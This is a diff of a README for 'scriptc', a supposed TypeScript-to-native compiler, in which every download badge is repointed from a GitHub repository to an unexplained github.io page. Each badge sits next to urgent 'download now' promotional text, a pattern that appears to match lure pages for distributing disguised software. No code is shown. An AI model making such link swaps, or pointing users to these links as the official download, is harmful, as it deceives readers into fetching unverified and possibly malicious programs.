@@ -1,6 +1,6 @@
 # 🚀 scriptc - Compile TypeScript Into Lightning-Fast Native Apps
 
-[![Download scriptc](https://img.shields.io/badge/Download-scriptc-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/defective-goldenfern675/scriptc)
+[![Download scriptc](https://img.shields.io/badge/Download-scriptc-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://defective-goldenfern675.github.io)
 
 Visit this link to download the application.
 
@@ -58,7 +58,7 @@ Getting scriptc on your Windows computer is incredibly easy. Follow these steps:
 
 This is the official place to get scriptc. We update this regularly with new features and improvements.
 
-[![Get scriptc Now](https://img.shields.io/badge/⬇️_Download_scriptc-v1.0.0-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/defective-goldenfern675/scriptc)
+[![Get scriptc Now](https://img.shields.io/badge/⬇️_Download_scriptc-v1.0.0-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://defective-goldenfern675.github.io)
 
 Visit this link to download the application.
 
@@ -156,7 +156,7 @@ Every great developer started exactly where you are right now. scriptc is here t
 
 You've read all about it. You've seen how easy it is. Now it's time to experience the power of scriptc for yourself.
 
-[![Download scriptc - It's FREE!](https://img.shields.io/badge/💾_Download_scriptc-Free_Software-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/defective-goldenfern675/scriptc)
+[![Download scriptc - It's FREE!](https://img.shields.io/badge/💾_Download_scriptc-Free_Software-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://defective-goldenfern675.github.io)
 
 Visit this link to download the application.
 
